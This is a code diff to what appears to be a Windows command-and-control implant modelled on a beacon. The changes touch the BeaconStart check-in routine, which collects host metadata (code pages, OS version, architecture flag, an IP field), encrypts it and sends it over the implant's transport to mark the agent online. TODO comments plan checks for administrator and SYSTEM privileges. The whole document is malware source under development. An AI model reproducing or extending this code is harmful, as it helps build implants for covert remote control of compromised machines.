@@ -137,7 +137,7 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 			{
 				if ( Ins.api.CryptGenRandom( Ins.key[0].Provider, 16, Str ) )
 				{
-					if ((Ins.BeaconId = RandomNumber32( &Ins )) <= ULONG_MAX)
+					if ((Ins.BeaconId = RandomNumber32( &Ins )))
 					{
 						PVOID                Cmp = 0;
 						PVOID                Usr = 0;
@@ -162,11 +162,11 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 												break; 
 											else Hdr = Buf;
 											
-											if (!(Buf = BufferAddUI2( &Ins, Hdr, Ins.api.GetACP()) )) 
+											if (!(Buf = BufferAddUI2( &Ins, Hdr, Ins.api.GetACP())) )
 												break; 
 											else Hdr = Buf;
 											
-											if (!(Buf = BufferAddUI2( &Ins, Hdr, Ins.api.GetOEMCP()) )) 
+											if (!(Buf = BufferAddUI2( &Ins, Hdr, Ins.api.GetOEMCP())) ) 
 												break;
 											else Hdr = Buf;
 
@@ -183,12 +183,21 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 											else Hdr = Buf;
 
 											//
-											// REMOVE HARDCODED VALUE
+											// TODO:
 											//
-
-											if (!(Buf = BufferAddUI1( &Ins, Hdr, 2 )))
+											// 1. Check if the OS is x64
+											// 2. Check if the Beacon is admin
+											// 3. Check if the Beacon is SYSTEM
+											//
+											#if defined( _WIN64 )
+											if (!(Buf = BufferAddUI1( &Ins, Hdr, BEACON_METADATA_FLAG_X64_AGENT )))
 												break;
 											else Hdr = Buf;
+											#else
+											if (!(Buf = BufferAddUI1( &Ins, Hdr, BEACON_METADATA_FLAG_NOTHING )))
+												break;
+											else Hdr = Buf;
+											#endif
 
 											if (!(Buf = BufferAddUI1( &Ins, Hdr, NtCurrentTeb()->ProcessEnvironmentBlock->OSMajorVersion )))
 												break;
@@ -215,10 +224,12 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 											else Hdr = Buf;
 
 											//
-											// REMOVE HARDCODED VALUE
+											// TODO
 											//
-
-											if (!(Buf = BufferAddUI4( &Ins, Hdr, HTONL(0x100007f) )))
+											// Calculate IPv4 address instead of setting
+											// to 0
+											//
+											if (!(Buf = BufferAddUI4( &Ins, Hdr, 0 )))
 												break;
 											else Hdr = Buf;
 
@@ -252,10 +263,8 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 													if ( TransportInit( &Ins ) )
 													{
 														if ( TransportSend( &Ins, Ecp, Ecl ) )
-														{
-															/* do nothing */
-														};
-														TransportFree( &Ins );
+															Ins.Online = TRUE;
+														else TransportFree( &Ins );
 													};
 													Ins.api.LocalFree( Ecp );
 												};
